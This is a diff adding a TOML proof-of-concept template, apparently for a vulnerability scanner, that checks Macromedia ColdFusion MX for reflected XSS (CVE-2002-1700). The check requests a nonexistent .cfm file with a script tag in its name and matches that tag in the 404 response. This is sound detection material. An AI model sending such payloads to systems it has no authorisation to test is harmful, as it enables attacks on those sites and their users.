@@ -1,0 +1,25 @@
+[info]
+author = "ave"
+description = "验证 ColdFusion MX 缺失模板处理模块是否存在 XSS 反射漏洞。向目标服务器请求不存在的 .cfm 模板文件并在模板名中注入脚本标记，若服务器在 404 错误页面中未过滤直接反射该模板名称，则说明存在 XSS 漏洞。"
+id = "POC-AVE-2002-0656"
+name = "Macromedia ColdFusion MX 缺失模板 XSS 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2002-0656"]
+vuln_id = [
+    "CVE-2002-1700",
+    "AVE-2002-0656",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nonexistent_<script>alert(1)</script>.cfm"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
